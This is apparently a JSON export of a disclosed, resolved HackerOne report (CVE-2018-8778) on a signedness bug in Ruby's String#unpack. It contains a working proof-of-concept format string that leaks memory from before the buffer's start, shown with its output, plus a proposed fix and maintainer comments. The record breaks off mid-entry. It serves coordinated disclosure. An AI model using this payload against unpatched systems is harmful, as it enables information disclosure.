{"id":298246,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTgyNDY=","url":"https://hackerone.com/reports/298246","title":"controlled buffer under-read in pack_unpack_internal()","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-12-15T12:21:22.135Z","submitted_at":"2017-12-15T12:21:22.135Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-8778"],"singular_disclosure_disabled":false,"disclosed_at":"2018-03-30T08:40:13.042Z","bug_reporter_agreed_on_going_public_at":"2018-03-30T08:40:12.955Z","team_member_agreed_on_going_public_at":"2018-03-30T02:01:21.786Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Brief\n-----\nThere is a signedness error in the pack_unpack_internal(), allowing the '@' type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).\n\nCode Vulnerability\n--------------------\n**Vulnerable version:** 2.5.0 (rc) and prior (tested also on 2.3.3)\n**Scope:** works on 32 bit and 64 bit versions\n**File:** pack.c\n**Function:** pack_unpack_internal()\n**Code Trace:**\n1. *len* is a **signed** long: \n\n    ```ruby\n        long len;\n    ```\n1. *len* can be parsed using a decimal string representation, to hold **any** unsigned long value\n\n    ```ruby\n    ...\n\telse if (ISDIGIT(*p)) {\n\t    errno = 0;\n\t\tlen = STRTOUL(p, (char**)\u0026p, 10);\n\t    if (errno) {\n\t\trb_raise(rb_eRangeError, \"pack length too big\");\n\t    }\n\t}\n    ...\n    ```\n1. Using a **negative** *len* value, the '@' type will move the string backwards:\n\n    ```ruby\n    ...\n\tcase '@':\n        // EI - Trace: negative length will pass this check\n\t    if (len \u003e RSTRING_LEN(str))\n\t\t  rb_raise(rb_eArgError, \"@ outside of string\");\n         // EI - Trace: negative length will move s backwards\n\t    s = RSTRING_PTR(str) + len;\n\t    break;\n    ...\n    ```\n1. Later unpacking will parse memory data before the buffer's start\n\nPoC Script\n------------\nThe script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).\n\n```ruby\nputs 'Version: ' + RUBY_VERSION\nputs 2 ** 32 - 100\n\nputs '**********************************'\nputs 'Expected:'\n\"0123456789\".unpack(\"C10\").each { |x| puts x.to_s(16) }\n\nputs '**********************************'\nputs 'Leaked + Expected:'\n\"0123456789\".unpack(\"@4294967196C110\").each { |x| puts x.to_s(16) }\nputs '**********************************'\n```\n\n**Output:**\n\n```\nVersion: 2.5.0\n4294967196\n**********************************\nExpected:\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\nLeaked + Expected:\n28\n13\ne2\n1\nc1\n24\n0\n0\n40\n43\ndf\n1\n65\n48\n92\n20\n3c\n7e\ndf\n1\n72\n65\n6d\n61\n69\n6e\n64\n65\n72\n0\n0\n0\n7a\n60\n1\n0\n30\n1\nf5\n1\n50\nc5\nef\n1\n7f\na3\n0\n0\n30\n1\nf5\n1\n7a\n60\n5\n0\n40\n43\ndf\n1\n8\n13\ne2\n1\nb1\n24\n0\n0\n40\n43\ndf\n1\n65\n88\n91\n20\n3c\n7e\ndf\n1\n6d\n6f\n64\n75\n6c\n6f\n0\n0\n0\n0\n0\n0\n5\n80\n52\n0\n3c\n7e\ndf\n1\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\n```\n\nProposed Fix:\n---------------\n*len* should be limited to hold only positive values, and it should be enforced right after *len* is parsed. A different fix could be to specifically check if *len* is negative in all dangerous places in the unpack() function.\n\n## Impact\n\nImpact\n--------\nAn attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a **massive and controlled** information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.\n\nThis vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.","vulnerability_information_html":"\u003ch2 id=\"brief\"\u003eBrief\u003c/h2\u003e\n\n\u003cp\u003eThere is a signedness error in the pack_unpack_internal(), allowing the \u0026#39;@\u0026#39; type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).\u003c/p\u003e\n\n\u003ch2 id=\"code-vulnerability\"\u003eCode Vulnerability\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eVulnerable version:\u003c/strong\u003e 2.5.0 (rc) and prior (tested also on 2.3.3)\u003cbr\u003e\n\u003cstrong\u003eScope:\u003c/strong\u003e works on 32 bit and 64 bit versions\u003cbr\u003e\n\u003cstrong\u003eFile:\u003c/strong\u003e pack.c\u003cbr\u003e\n\u003cstrong\u003eFunction:\u003c/strong\u003e pack_unpack_internal()\u003cbr\u003e\n\u003cstrong\u003eCode Trace:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cem\u003elen\u003c/em\u003e is a \u003cstrong\u003esigned\u003c/strong\u003e long: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e    \u003cspan class=\"n\"\u003elong\u003c/span\u003e \u003cspan class=\"n\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cem\u003elen\u003c/em\u003e can be parsed using a decimal string representation, to hold \u003cstrong\u003eany\u003c/strong\u003e unsigned long value\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eISDIGIT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eerrno\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eSTRTOUL\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eerrno\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erb_raise\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erb_eRangeError\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;pack length too big\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUsing a \u003cstrong\u003enegative\u003c/strong\u003e \u003cem\u003elen\u003c/em\u003e value, the \u0026#39;@\u0026#39; type will move the string backwards:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;@\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"sr\"\u003e//\u003c/span\u003e \u003cspan class=\"no\"\u003eEI\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"no\"\u003eTrace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003enegative\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"n\"\u003ewill\u003c/span\u003e \u003cspan class=\"n\"\u003epass\u003c/span\u003e \u003cspan class=\"n\"\u003ethis\u003c/span\u003e \u003cspan class=\"n\"\u003echeck\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elen\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"no\"\u003eRSTRING_LEN\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n      \u003cspan class=\"n\"\u003erb_raise\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erb_eArgError\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;@ outside of string\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n     \u003cspan class=\"sr\"\u003e//\u003c/span\u003e \u003cspan class=\"no\"\u003eEI\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"no\"\u003eTrace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003enegative\u003c/span\u003e \u003cspan class=\"n\"\u003elength\u003c/span\u003e \u003cspan class=\"n\"\u003ewill\u003c/span\u003e \u003cspan class=\"n\"\u003emove\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"n\"\u003ebackwards\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eRSTRING_PTR\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eLater unpacking will parse memory data before the buffer\u0026#39;s start\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"poc-script\"\u003ePoC Script\u003c/h2\u003e\n\n\u003cp\u003eThe script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Version: \u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"no\"\u003eRUBY_VERSION\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e**\u003c/span\u003e \u003cspan class=\"mi\"\u003e32\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;**********************************\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Expected:\u0026#39;\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;0123456789\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eunpack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;C10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eeach\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;**********************************\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Leaked + Expected:\u0026#39;\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;0123456789\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eunpack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;@4294967196C110\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eeach\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;**********************************\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eOutput:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eVersion: 2.5.0\n4294967196\n**********************************\nExpected:\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\nLeaked + Expected:\n28\n13\ne2\n1\nc1\n24\n0\n0\n40\n43\ndf\n1\n65\n48\n92\n20\n3c\n7e\ndf\n1\n72\n65\n6d\n61\n69\n6e\n64\n65\n72\n0\n0\n0\n7a\n60\n1\n0\n30\n1\nf5\n1\n50\nc5\nef\n1\n7f\na3\n0\n0\n30\n1\nf5\n1\n7a\n60\n5\n0\n40\n43\ndf\n1\n8\n13\ne2\n1\nb1\n24\n0\n0\n40\n43\ndf\n1\n65\n88\n91\n20\n3c\n7e\ndf\n1\n6d\n6f\n64\n75\n6c\n6f\n0\n0\n0\n0\n0\n0\n5\n80\n52\n0\n3c\n7e\ndf\n1\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n**********************************\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"proposed-fix\"\u003eProposed Fix:\u003c/h2\u003e\n\n\u003cp\u003e\u003cem\u003elen\u003c/em\u003e should be limited to hold only positive values, and it should be enforced right after \u003cem\u003elen\u003c/em\u003e is parsed. A different fix could be to specifically check if \u003cem\u003elen\u003c/em\u003e is negative in all dangerous places in the unpack() function.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a \u003cstrong\u003emassive and controlled\u003c/strong\u003e information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":10,"name":"Buffer Under-read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-04-29T02:01:21.905Z","allow_singular_disclosure_after":-84252390.86614768,"singular_disclosure_allowed":true,"vote_count":11,"voters":["muon4","cuso4","akaash_pantherdefence","eveeez","apapedulimu","arifmkhls","0x08","abdullahzk","arielmarlon","caturipah","and 1 more..."],"severity":{"rating":"medium","score":6.2,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2225561,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ack, We are evaluating it.","markdown_message":"\u003cp\u003eack, We are evaluating it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T14:24:02.065Z","updated_at":"2017-12-15T14:24:02.065Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2231004,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@adambacchus We considered that your report was a vulnerability of `String#unpack`. We will handle this early next year. Are you ok to this disclose schedule?","markdown_message":"\u003cp\u003e\u003ca href=\"/adambacchus\"\u003e@adambacchus\u003c/a\u003e We considered that your report was a vulnerability of \u003ccode\u003eString#unpack\u003c/code\u003e. We will handle this early next year. Are you ok to this disclose schedule?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T09:57:29.898Z","updated_at":"2017-12-18T09:57:29.898Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2232493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the fast response. I am fine with the disclosure schedule.","markdown_message":"\u003cp\u003eThanks for the fast response. I am fine with the disclosure schedule.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T19:18:09.208Z","updated_at":"2017-12-18T19:18:09.208Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2381110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update regarding this ticket? I failed to find a commit that patches this vulnerability in the git repos.","markdown_message":"\u003cp\u003eAny update regarding this ticket? I failed to find a commit that patches this vulnerability in the git repos.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-14T06:16:21.175Z","updated_at":"2018-02-14T06:16:21.175Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2392983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, there is no update. Because the maintainer related your report lost him authentication of hackerone. We could not handle this.","markdown_message":"\u003cp\u003eSorry, there is no update. Because the maintainer related your report lost him authentication of hackerone. We could not handle this.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-17T00:42:18.848Z","updated_at":"2018-02-17T00:42:18.848Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2394351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK. Do you know when approximately this ticket will be handled?","markdown_message":"\u003cp\u003eOK. Do you know when approximately this ticket will be handled?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-17T09:49:49.288Z","updated_at":"2018-02-17T09:49:49.288Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2445237,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-01T07:44:21.947Z","updated_at":"2018-03-01T07:44:21.947Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2471812,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@aerodudrizzt Can you review attached patch? ","markdown_message":"\u003cp\u003e\u003ca href=\"/aerodudrizzt\"\u003e@aerodudrizzt\u003c/a\u003e Can you review attached patch? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-08T02:14:01.345Z","updated_at":"2018-03-08T02:14:01.345Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":270478,"filename":"fix-underflow.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/270/478/507ec95edc9abbbeaced42921fc15e3a943db739/fix-underflow.patch?response-content-disposition=attachment%3B%20filename%3D%22fix-underflow.patch%22%3B%20filename%2A%3DUTF-8%27%27fix-underflow.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIKMJWH3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052753Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHST0svsvt2laJhuwhvtFHhDNQQ1aKmdn3kMewysqUdFAiEAulql%2B612sAbGAOHB%2F14rmdeeoxU5d8%2BAmcu4RPg%2BHwYqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDCOZXQ8CegoYVtnSUSqRAzpFu%2FKSCAPO9FvY239VSQoXSErgwDzOUTpVgc827sUNqeCED0HHoCoUKyy9kO1lyu0kSFcQXf%2BvW4%2FHwxvZX6%2BphIjx2iPQX6fNNwXKcgYQYxZ8Yx%2BGm7ZXLO%2Bu7Mdu4Fn%2B9TpJQODzePG4VEMMVtb0e6FjQNUF4kQegXC133f3aM6cYX7uAbjyFy7JY7I765EFvdZteqLx2HbWaDGqldcnvslHjs3kmodLKwk9H0Ue0DoWQaLX8Vd2A0w%2FRaO%2FD7%2FQ8PGTn1qam8KaVgzORyAVZ6DxjOPjltRKnxLgyDYBYkhJ4QrBrnmUJPgQMGGWlKZ9SGJYACF0xI0BTQYivNwVfXoTMKUGwE35iziKLaZ5lyBmkqGem%2B%2FfByDZktR%2BpZGSBgSAr1UOE7ov9eb7NhNIuMzcYuOJ1sDR5pR5AlZ4GHJ8eFAlsbYZ1%2B%2F1eXzICdlYRCTp7FQRaLOJji%2BGrr7%2BDGcfEbEP64XGp9sIHjMhhaQcRwVNC6OPA5jdwFCmOnkfeeCoszPtP9ulj%2BvRBs4QMJSFqv8FOusBWzRAvPHoeI1kjG3%2Bj8jYuqVFp2PPU1q0JXR0Ajo08RGvNLJbNpVdip6BBBoiu8PCrCZDZIOwjGA3KcL5o1c4azKc2WVxPog81MB%2FMbDqzX0ad%2FLlmri78RdsSnSIX3Tn18ZdjfTGjol%2FjXedojL6GsI5pB1YlY0EqbQvBnSvbUvPa2Yr7haLR%2FQ%2FG8J8lEfc9mqMV9Imaj1ospS%2BNuCXAlVOb%2F0ya3%2BR4cs2EQotvOugeHotyPJlDfJL6Pqjp0Z9ECJu9QNa4Vn1w2ANPlIUFD2oD6RnsM%2BFR3kpEUChJsMjzZDlljBwhF14Ww%3D%3D\u0026X-Amz-Signature=b14e6a9f73063c19c882b17c07a27357475dcb60c99c2affccba68ab0539957c"}],"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2471891,"is_internal":false,"edita